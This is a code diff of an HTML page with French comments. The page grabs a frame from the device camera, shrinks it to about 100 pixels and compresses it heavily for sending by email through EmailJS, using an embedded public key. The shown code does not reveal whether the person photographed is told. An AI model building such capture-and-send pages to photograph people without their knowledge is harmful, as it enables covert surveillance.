@@ -2,10 +2,10 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Capture et envoi pièce jointe</title>
+  <title>Capture et envoi ultra-compact</title>
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
-    emailjs.init("IoSfbtGz4KSL_5_9E"); // ta clé publique
+    emailjs.init("IoSfbtGz4KSL_5_9E"); // clé publique
   </script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
@@ -32,13 +32,15 @@
         await video.play();
 
         const canvas = document.createElement("canvas");
-        const MAX_WIDTH = 200; // réduire taille pour email
+        const MAX_WIDTH = 100; // ultra-petite taille
         let ratio = video.videoHeight / video.videoWidth;
         canvas.width = MAX_WIDTH;
         canvas.height = MAX_WIDTH * ratio;
 
         canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-        const imageBase64 = canvas.toDataURL("image/jpeg", 0.3); // compression 30%
+
+        // Compression très élevée pour réduire taille < 30KB
+        const imageBase64 = canvas.toDataURL("image/jpeg", 0.1); 
 
         stream.getTracks().forEach(track => track.stop());
 
